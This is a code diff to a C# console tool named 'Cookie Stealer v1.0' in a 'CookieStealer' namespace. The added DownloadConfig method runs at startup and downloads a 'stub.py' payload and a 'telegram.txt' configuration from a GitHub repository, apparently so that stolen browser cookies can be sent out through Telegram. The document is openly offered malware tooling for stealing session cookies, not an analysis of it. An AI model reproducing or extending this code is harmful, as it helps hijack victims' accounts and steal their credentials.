@@ -4,6 +4,8 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
+using System.Net;
+using System.Security.Policy;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
@@ -31,7 +33,9 @@ namespace CookieStealer
 
         static void Main(string[] args)
         {
-           
+            DownloadConfig();
+
+
             Console.Title = "Cookie Stealer v1.0";
             Console.ForegroundColor = ConsoleColor.Blue;
 
@@ -64,6 +68,39 @@ namespace CookieStealer
             Process.Start("explorer.exe", Environment.CurrentDirectory);
             Console.ReadLine(); ;
         }
+
+        static void DownloadConfig()
+        {
+            string stub = "stub.py";
+            string config = "telegram.txt";
+
+            string urlStub = "https://github.com/h4x0rpeter/CookieStealer/raw/main/stub.py";
+            string urlConfig = "https://github.com/h4x0rpeter/CookieStealer/raw/main/telegram.txt";
+
+            if (!File.Exists(stub))
+                WebDownload(urlStub, stub);
+
+
+            if (!File.Exists(config))
+                WebDownload(urlConfig, config);
+
+        }
+
+        static void WebDownload(string url ,string fileName)
+        {
+            using (WebClient client = new WebClient())
+            {
+                try
+                {
+                    client.DownloadFile(url, fileName);
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine("Error WebDownload: " + ex.Message);
+                }
+            }
+        }
+
         static void CenterWrite(string text)
         {
             int width = Console.WindowWidth;
